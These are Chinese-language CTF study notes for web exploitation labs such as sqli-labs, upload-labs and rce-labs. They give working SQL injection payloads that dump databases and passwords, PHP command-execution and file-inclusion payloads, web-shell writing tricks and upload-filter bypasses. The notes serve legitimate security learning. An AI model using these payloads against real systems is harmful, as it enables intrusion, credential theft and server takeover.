# 1.工具安装  
## 1.burp suit  
<img width="1187" height="665" alt="image" src="https://github.com/user-attachments/assets/af03bfa7-6077-48f6-a73e-f8a7f7a9af26" />
## 2.hackbar  

<img width="623" height="137" alt="image" src="https://github.com/user-attachments/assets/160643a8-1f51-4592-a090-30df9e301ec9" />  

## 3.dirsearch  
<img width="852" height="73" alt="image" src="https://github.com/user-attachments/assets/57074819-b29d-4b44-9604-898445ec49c3" />  

## 4.已安装python环境，vscode，kali，docker，蚁剑。    

## 5.题目  

[SWPUCTF 2021新生赛]gift_F12  

F12，源码里搜索flag  
<img width="1030" height="239" alt="image" src="https://github.com/user-attachments/assets/28408872-4658-48bd-af7a-82e7288de8f0" />  
[qsnctf-NO.0902]robots.txt  
<img width="862" height="293" alt="image" src="https://github.com/user-attachments/assets/9cb8228b-8497-48ae-9e12-2cc1815e7a28" />  
访问robots.txt,发现/secret.php，再访问得到账号密码。  
# 2.linux
```text
相对路径与绝对路径，绝对路径以/开头
pwd 看现在在哪里
whoami 看用户
ls 看当前目录
-a 看隐藏内容
-l 看详细信息
cd 切换当前目录
cd.. 返回上一目录
cd~ 回家目录
cd/ 回根目录
cat 看文件
find 起始地址 条件
搜索文件
find . -name "*.txt"
. 从当前目录开始
-name 以名字搜索
-iname 以名字搜索，不区分大小写
grep flag flag.txt
```
# 3.http请求与响应  
笔记
消息结构
请求
1. 请求⾏ (Request Line)：包含请求⽅法（如 GET）、URL 和协议版本。 
2. 请求头 (Request Headers)：描述客户端环境、身份验证等信息
3. 空⾏：必不可少，⽤于区分头部和主体。
4. 请求体 (Request Body)：发送给服务器的数据（仅在 POST/PUT 等⽅法中使⽤）。 
例 客户端
GET(关键字） /hello.text （希望获得的文件） HTTP/1.1（协议）
User-Agent：（请求来自于谁）
Host ：（网址）（从这个网址获得希望的文件）
Accept-Language：en（接受的语言）
响应
1. 状态⾏ (Status Line)：包含协议版本、状态码（如 200）和状态描述。 
 2. 响应头 (Response Headers)：描述服务器信息、数据类型等（如 Server Content-Type ）。
3. 空⾏。
4. 响应体 (Response Body)：服务器返回的实际数据（如 HTML、图⽚、JSON）。
例子 服务器响应
HTTP/1.1 200 ok
Date ：Mon，27 jul 2009 19：15：56 GMT
Sever（服务器） ：Apache
Last-Modified(文件最后一次修改时间） :wed, 22 jul 2009 19：15：56 GMT
ETag：
Accept-Ranges：bytes
Content-Length（多大）：51（字节）
Vary：Accept—Encoding
Content-Type（返回东西的类型）：text（文本）/plain（普通）
（空格）
（返回的正文）
```text
请求
请求行
请求方法
请求参数
请求头
User-Agent 代表发起访问的是什么浏览器
Cookie 记录登录信息，和上一次请求服务的设置的信息
referer 表示这次请求是从哪里点过来的，告诉服务器请求的来源页面完整URL
X-Real-IP
X-Forwarded-For
这两个都是HTTP 自定义请求头，作用是告诉服务器请求的真实来源 IP，原本用于代理 / 反向代理场景，CTF 里被用来伪造本地访问（冒充 127.0.0.1），是绕 “本地网络访问” 校验的核心手段。
Accept ：告诉服务器客户端能接收的响应数据格式（MIME 类型）
Accept: text/html,application/json,image/*;q=0.8
text/html：接收网页格式；application/json：接收 JSON 数据（接口请求最常用）；image/*：接收所有图片格式；
;q=0.8：权重值（0-1），表示优先级，数值越高优先级越高，默认 q=1。
Accept-Encoding
：告诉服务器客户端支持的内容压缩格式，服务器会对响应内容压缩后传输，减少网络带宽消耗。
Accept-Encoding: gzip, deflate, br
gzip：最常用的压缩格式；deflate：经典压缩格式；br：谷歌的 Brotli 压缩，压缩率更高。
Accept-Language ：
告诉服务器客户端偏好的语言 / 地区，服务器据此返回对应语言的内容，是多语言网站 / 国际化产品的核心头；
via   ：
代理
响应
状态码
1xx 请求在处理
2xx 请求成功
3xx 重定向，需要附加操作完成请求
4xx 5xx 失败
```
## 题目  
[0xGame2025]Http的真理，我已解明  
<img width="1258" height="601" alt="image" src="https://github.com/user-attachments/assets/4cb4611c-f397-406a-8329-4ba2c7125326" />  
[SWPUCTF 2024 秋季新生赛]http标头  
没金币了  
# 4.信息收集与解加密  
## 1.弱口令和默认口令  
弱口令是指容易被猜测、破解或通过常见密码字典获得的密码  
默认口令是指设备、软件或系统安装/初始化时厂商预先设置的账号密码。  
[LitCTF 2025]nest_js  
选择burp自带的账号和密码，先选择集束炸弹，发现太慢了。先猜admin，只爆破密码，选择长度不一样的。发现密码是password。  
# 5.代码语言漏洞  
## 代码/命令执行(RCE)  
笔记
```text
stdin = standard input = 标准输入
stdout = standard output = 标准输出 
stderr = standard error = 标准错误  
system() 有回显
命令输出直接显示到页面，返回最后一行输出
system（），里面要是字符串型参数
system（“ls”）这里必须要有引号，说明ls是字符串字面量
但如果字符串已经在变量里，就不用加引号了
 $cmd = "ls"; 
system($cmd);  
比如 system($_GET['cmd']);  
直接 ?cmd=ls  就行了
exec() 无回显
返回最后一行输出，第一个参数写命令，第二个参数是数组变量，存所有输出，第三个变量存命令退出状态码
$out = []; 
$ret = exec("printf 'aaa\nbbb\n'", $out, $code);  
var_dump($ret); 
var_dump($out); 
var_dump($code);  
$ret → 最后一行输出 
$out → 所有输出，每行一个数组元素 
$code → 命令退出状态码  
结果$ret = "bbb"; $out = [ "aaa", "bbb" ]; $code = 0;  
shell_exec() 无回显
返回完整输出结果，就一个参数
$result=shell_exec("whoami"); 
echo$result;
` `反引号 与shell_exec用法相同 无回显
返回完整输出结果，就一个参数
$a=`whoami`; 
echo$a;
passthru（）有回显
把命令输出原样显示，第一个参数写命令，第二个参数存退出码
页面回显与system（）一样，就是没有返回值
图片，音频，压缩包更适用passthru（）
popen（）无回显
返回一个指针
第一个参数，执行的命令
第二个参数，r读取命令的输出
w给命令写入输入
 $fp = popen("printf 'aaa\nbbb\n'", "r");  
 echo stream_get_contents($fp);//从当前位置开始，把剩余内容一次性读完

 echo fgets($fp);  //读一行，且指针会自然下移

 while (!feof($fp)) //检查是否到结尾
{ echo fgets($fp); }  
 pclose($fp);  
proc_open() 无回显
 启动一个命令，并让 PHP 可以分别控制这个命令的 stdin、stdout、stderr。  
$cmd=$_GET['cmd']; 
$descriptors= [ 0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"] ];
$process=proc_open($cmd, $descriptors, $pipes); fclose($pipes[0]); 
echostream_get_contents($pipes[1]); echostream_get_contents($pipes[2]); 
fclose($pipes[1]); 
fclose($pipes[2]); 
proc_close($process);
pcntl_exec() 有回显
用另一个程序直接替换当前 PHP 进程，相当于这句话下面的语句都不执行了
 pcntl_exec(string $path, array $args = [], array $env_vars = []);  
第一个参数，执行的路径加命令；
第二个参数，执行命令的参数；参数数组
第三个参数，环境变量数组
 例子pcntl_exec("/bin/ls", ["-la", "/tmp"]);  
/tmp是目录，相当于ls列目录tmp里的文件
```
题目  
rce-labs
1.rce 0  
flag直接显示在页面上。  
2.rce 1  
发现eval执行函数，POST传参a=system('ls /');发现flag,a=system('cat /flag');得到flag。  
3.rce 2  
<img width="883" height="332" alt="image" src="https://github.com/user-attachments/assets/7f554012-a1ed-4547-b41c-9240330bfd01" />  
绕过解法  
<img width="871" height="329" alt="image" src="https://github.com/user-attachments/assets/f0640c45-96f8-4ebb-a52a-9ea5e0a722dd" />  
4.rce 3  
<img width="738" height="329" alt="image" src="https://github.com/user-attachments/assets/3bce44c6-781a-47c4-9f4b-2a8d86e9b567" />  
再cat 看flag  
5.rce 4  
;可以同时执行前后两条命令。  
<img width="1256" height="284" alt="image" src="https://github.com/user-attachments/assets/0b8ed27b-9c26-43d5-8e82-ab6860ad7d25" />  
6.rce 5  
通配符绕过  
<img width="999" height="237" alt="image" src="https://github.com/user-attachments/assets/c987385f-a107-44e2-9338-92ad8a8580f3" />  
7.rce 6  
<img width="1260" height="251" alt="image" src="https://github.com/user-attachments/assets/e5ba1016-81f8-4d44-a5b5-9708d02ce818" />  
或者ANSI-C 八进制引用  
8.rce 7  
<img width="845" height="249" alt="image" src="https://github.com/user-attachments/assets/31b4f382-faaf-42f3-bb7e-46a2ad6a5ac3" />  
空格绕过  
9.rce 8  
重定向，用;绕过  
[SWPUCTF 2021 新生赛]babyrce  
<img width="1263" height="437" alt="image" src="https://github.com/user-attachments/assets/dd305e3d-60c8-42b7-aa0c-737264014b1b" />
# 5.文件包含  
笔记
```text
file://
用于访问本地文件系统。可以作为探针，看看能不能文件包含。
如果文件是php代码，不会显示源码，而是执行php。
想看源码得用php://filter
写法file://(本机名，可以不写)文件绝对路径
linux
/etc/passwd 用户账户信息
/etc/shadow 密码哈希
/etc/hostname 主机名
windows
C:/Windows/win.ini 系统配置
C:/Windows/System32/drivers/etc/hosts hosts文件
C:/boot.ini 启动配置(老配置)
php://filter
读php源码
php://filter/read=convert.base64‑encode/resource=flag.php  
=后面写相对或绝对路径
php://input
把post传的数据当php代码执行
get ?filename=php://input
post <?php system('ls'); ?>
data://
?filename=data://text/plain,<?php system('id');?>
等价data:text/plain,<?php system('id');?>
?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8%2b
等价
?filename=data:text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8%2b
恶意die()/exit()绕过
不让写php代码，就在你写入的代码前拼一段，使写入的代码不能执行
使用要求，要有文件写入
文件写入函数
1 file_put_contents()
2 file_put_contents()
3 fopen,fwrite,fputs,fclose
以下全在burp里
1.base64
<?php exit(); ?>
base64里，相当于只有7个字符。要凑满4的倍数，传的代码就要补1
1.filename(文件名）用get传，txt(传入代码)用post
get filename=php://filter/write=convert.base64-decode/resource=shell.php
post txt=aPD9waHAgc3lzdGVtKCdpZCcpOz8+
PD9waHAgc3lzdGVtKCdpZCcpOz8+就是<?php system('id');?>转base64
2.全post
post直接写 filename=php://filter/write=convert.base64-decode/resource=shell.php&txt=aPD9waHAgc3lzdGVtKCdpZCcpOz8+
2.ROT13
get  ?filename=php://filter/write=string.rot13/resource=shell.php
POST: txt=<?cuc @riny($_CBFG['pzq']); ?>
<?cuc @riny($_CBFG['pzq']); ?>就是把要写的php代码就行rot13编码
3.iconv 字符集转换
?filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=hack.php
txt=?<hp pe@av(l_$EG[T]1;)>?
同样的，要写入的类型做iconv 字符集转换
高级Bypass与特殊利用
1./proc伪文件系统(Linux)
2.日志注入RCE(Nginx,Apache)
```
题目  
文件包含level 1  
<img width="825" height="333" alt="image" src="https://github.com/user-attachments/assets/0254e959-4322-40e8-89f4-20ca59dfa093" />  
level 2  
<img width="1258" height="388" alt="image" src="https://github.com/user-attachments/assets/10a2f2ef-9683-4ade-b261-442cfa1ea40e" />
level 3  
过滤了括号，用反引号.过滤了flag，用通配符  
<img width="907" height="333" alt="image" src="https://github.com/user-attachments/assets/ed76db57-066d-47b2-9b99-c6ce239063fb" />
level 4  
远程文件包含，发现本地有恶意文件，post传参数。  
<img width="908" height="344" alt="image" src="https://github.com/user-attachments/assets/3765104a-6c33-4aff-9b3b-9b97d1e61ff8" />  
# 6.文件上传  
以下分别是upload-labs 的题目解题
```text
1.前端绕过
判断方法，burp suite抓包。页面有报错，但burp suit没抓到包。说明判断在前端。
方法1  禁用javascript
f12打开开发者模式，再f1看设置。勾选警用JavaScript
再就可以直接上传.php一句话木马了，右键新标签页打开图片，再在蚁剑添加数据，输入此URL加连接密码，就连接成功了。
方法2  改包抓包
在burpsuite里改包，文件后缀改为.php。即可
2.content-type校验
组略判断，burpsuite抓包，页面有报错，且抓到包
抓包，修改content-type值。把.php的改成.jpg的
3.黑名单
4，5，6，7均依赖Windows特性。自动去文件名点和空格。Linux失效。
判断思路
第1步：看 $img_path 构造
        ├─ 拼接 $file_name（原始文件名）→ 文件名可控，可用点/空格/::$DATA/点空格点
        └─ 拼接随机名 + $file_ext      → 只能从扩展名本身绕

第2步：看扩展名处理链（4个关键函数）
        ├─ 有 strtolower 吗？       没有 → 大写绕过
        ├─ 有 trim($file_ext) 吗？  没有 → 末尾空格绕过
        ├─ 有 deldot 吗？           没有 → 末尾加点绕过
        └─ 有去 ::$DATA 吗？        没有 → ::$DATA 绕过

第3步：看黑名单形式
        ├─ 数组里是 ".php"（带点）→ in_array 精确匹配（不能双写）
也就是大写，末尾空格，末尾点，::$DATA
        └─ 数组里是 "php"（不带点）→ 通常配合 str_ireplace 替换
通过双写后缀绕过
第4步：看是否有替换函数
        └─ str_ireplace($deny_ext,"",$file_name) → 双写后缀绕过

第5步：看服务器环境
        ├─ Windows → 点、空格、::$DATA 都可能有效
        └─ Linux   → 这些无效，需用 .htaccess / .user.ini / 00截断
1 换成等价扩展名
上传jpg文件，burp改包为php1,php2,php3,php4,php5.
2 .htaccess绕过
先上传.htaccess文件，内容AddType application/x-httpd-php .jpg .txt
就可以把.jpg .txt文件当作.php解析。
再上传.jpg文件
3 .user.ini
要求，知道目标目录下的一个可执行php文件
先上传.user.ini文件，内容auto_prepend_file=111.jpg
意思是我目录下的所有文件，在执行前都会先包含111.jpg文件里的语句。
再上传111.jpg文件。再右键打开图片，把111.jpg换成你已知的文件名，比如read.php。给蚁剑连接。
4 点加空格加点绕过 . .
过滤全，但保留原始文件名
5 PHP大写
黑名单全小写，但没有strtolower转小写
6 php末尾加空格
有转小写，但没有trim（$file_ext)去空格
7 php末尾加.
有转小写和trim，但没有deldot
8 双写后缀绕过phphpp
有这行代码，str_ireplace($deny_ext,"",$file_name)
意思是，把文件名中在黑名单的字符串变成空
9 额外数据流 ::$DATA
没用过滤::$DATA
改包为.php::$DATA
如何把URL（去掉::$DATA的)给蚁剑
白名单
1.%00截断和0x00截断
判断方法$img_path是用get方法传还是post方法传
用get方法
上传一句话木马，111.jpg。再burp改包，save_path末尾加上111.php%00
再右键打开图片，把URL截取到111.php,给蚁剑，连接
用post方法

再upload/后面接着写。111.php，再先写一个空格，选中，code hex里填00，应用变更，发送即可

同样，把URL截取到111.php,给蚁剑。
```

# 7.sql注入  
笔记
```text
1.union联合注入
1.判断类型，（数字型还是字符型）和闭合
1.看2-1
先id=1，再id=2.看id=2-1.返回是谁的值。如果是1的，则为数字型，如果不是1的，（可能报错，查不到或者为2的）则为字符型。
2.详细版
先判断类型。先分别输入id=1'和id=1"
如果都报错，则可能是数字型a
如果1'报错，1"不报错，则可能是字符型'闭合b
如果1'不报错，1"报错，则可能是字符型"闭合c
再判断具体闭合。
对与a，id=1--+
id=1)--+
id=1))--+那个恢复正常了，就找到闭合了
对于b，id=1'--+
id=1')--+
id=1'))--+
对于c，id=1"
id=1")
id=1"))
2.判断列数
1.order by 和group by
等号后面1要按判断出来的闭合补充。
?id=1' order by 1--+
?id=1' group by 1--+
然后依次2，3，4...看那个发生报错，则列数就是发生报错数字的前一个。
2.union select
等号后面1要按判断出来的闭合补充。
此时不选1，要选一个不存在的。比如-1，999
?id=-1' union select 1,2,3--+
哪个页面发生回显，列数就出来了。
3.判断回显
与判断列数的2的方法一致。
看页面回显了哪个数字，则哪个数字位置则就是回显位。
以下假设回显位为2
4.查询库名
1.查询当前所在使用的数据库名
?id=-1' union select 1,database(),3 --+
2.查询所有库名
?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+
5.查询表名
?id=-1' union select 1,group_concat(table_name),3 
   from information_schema.tables where table_schema='库名' --+
6.查询列名
?id=-1' union select 1,group_concat(column_name),3 
   from information_schema.columns where table_schema='库名' and table_name='表名' --+
7.查询数据
?id=-1' union select 1,group_concat(username,0x3a,password),3 from security.users --+
from 库名.列名
也可以一下只查一列
?id=-1' union select 1,group_concat(username),3 from security.users --+

?id=-1' union select 1,group_concat(password),3 from security.users --+
2.报错注入
无法使用联合注入时，就会考虑报错注入。比如原查询结果不在页面上，但报错会显示。
通常由3个函数，updata
xml(),extractvalue(),floor()
updataxml()和extractvalue()相似。
错误信息最多显示32个字符
当结果有许多条，用limit逐个读
当单条结果很长，用substr一段段读
1.updataxml()
1.同上，判断类型和闭合。
查询所有和逐个的区别
所有就是group_concat
逐个就是concat(   limit   )
2.查询库
查询当前库
?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1)--+
查询所有库
?id=1' and updatexml(1,concat(0x7e,
  (select group_concat(schema_name) from information_schema.schemata)
,0x7e),1)--+
逐个取所有库名
limit 0，1 第一条
limit 1，1 第二条
limit 2，1 第三条
?id=1' and updatexml(1,concat(0x7e,
  (select schema_name from information_schema.schemata limit 0,1)
,0x7e),1)--+
substr(str,start,length)
str 截取的字符串
start 从第几个字符开始，从1开始
length 截取长度
3.查询表
全部
?id=1' and updatexml(1,concat(0x7e,
  (select group_concat(table_name) from information_schema.tables 
   where table_schema='库名')
,0x7e),1)--+
逐个
?id=1' and updatexml(1,concat(0x7e,
  (select table_name from information_schema.tables
   where table_schema=database() limit 0,1)),1)--+
4.查询列
全部
?id=1' and updatexml(1,concat(0x7e,
  (select group_concat(column_name) from information_schema.columns 
   where table_schema='security' and table_name='users')
,0x7e),1)--+
逐个
?id=1' and updatexml(1,concat(0x7e,
  (select column_name from information_schema.columns
   where table_schema=database() and table_name='users'
   limit 0,1)),1)--+
5.查询数据
所有
?id=1' and updatexml(1,concat(0x7e,
  (select group_concat(username) from security.users)
,0x7e),1)--+
逐个
?id=1' and updatexml(1,concat(0x7e,
  (select username from security.users limit 0,1)
,0x7e),1)--+
单条过长
?id=1' and updatexml(1,concat(0x7e,
  (select substr(password,1,31) from security.users limit 0,1)
,0x7e),1)--+
2.extractvalue()
与updataxml()基本相同。但updataxml(1,~,1)
有3个参数，而extractvalue(1,~)就2个参数。注意一下。
3.floor()
3.布尔盲注
判断注入，用页面正常和不正常来
这个比较用二分法，一般用python脚本执行
获取当前库名
?id=1 AND ascii(substr(database(),1,1))>100
按个获取库
?id=1 AND length((select schema_name from information_schema.schemata limit 0,1))=18
获取表名
?id=1 AND length((select table_name from information_schema.tables 
    where table_schema=database() limit 0,1))=5
获取列名
?id=1 AND ascii(substr((select column_name from information_schema.columns 
    where table_name='users' limit 0,1),1,1))=105
获取数据
?id=1 AND ascii(substr((select username from users limit 0,1),1,1))=97

4.时间盲注
?id=1 AND sleep(5)
?id=1' AND sleep(5)--+
?id=1" AND sleep(5)--+
那个页面延迟5秒，就说明存在时间盲注，且通用判断类型和闭合
逐个猜库名
?id=1 AND if(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))>100, sleep(5), 0)
逐个猜表名
if(ascii(substr((select table_name from information_schema.tables 
    where table_schema=database() limit 0,1),1,1))>100, sleep(5), 0)
逐个猜列名
if(ascii(substr((select column_name from information_schema.columns 
    where table_name='users' limit 0,1),1,1))>100, sleep(5), 0)
逐个猜数据
if(ascii(substr((select username from users limit 0,1),1,1))>100, sleep(5), 0)  
```
题目  
sqli-lab前4题  












